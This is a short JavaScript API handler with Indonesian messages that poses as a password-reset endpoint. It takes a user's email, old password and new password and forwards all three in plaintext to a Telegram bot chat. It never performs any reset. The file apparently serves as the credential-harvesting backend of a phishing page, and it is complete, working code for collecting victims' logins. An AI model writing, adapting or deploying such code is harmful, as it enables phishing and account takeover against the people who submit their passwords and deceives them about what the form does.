import fetch from 'node-fetch'; // Tambahkan ini hanya jika pakai Node <18

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  const text = `
🔒 Permintaan Reset Password:
📧 Email: ${email}
🔑 Sandi Lama: ${oldPass}
🆕 Sandi Baru: ${newPass}
`;

  try {
    const telegramRes = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      }
    );

    if (!telegramRes.ok) throw new Error('Gagal kirim ke Telegram');

    res.status(200).json({ message: 'Berhasil' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Gagal kirim ke Telegram' });
  }
}
